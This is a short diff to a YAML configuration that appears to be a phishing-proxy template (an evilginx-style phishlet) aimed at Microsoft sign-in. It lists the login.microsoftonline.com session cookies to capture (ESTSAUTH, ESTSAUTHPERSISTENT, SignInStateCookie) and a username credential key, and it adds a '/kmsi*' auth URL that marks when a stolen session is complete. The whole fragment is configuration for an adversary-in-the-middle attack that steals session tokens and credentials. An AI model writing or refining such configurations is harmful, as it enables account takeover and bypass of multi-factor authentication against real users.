@@ -23,6 +23,8 @@ auth_tokens:
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
   - domain: 'login.microsoftonline.com'
     keys: ['SignInStateCookie']
+auth_urls: 
+  - '/kmsi*'
 credentials:
   username:
     key: '(login|UserName)'
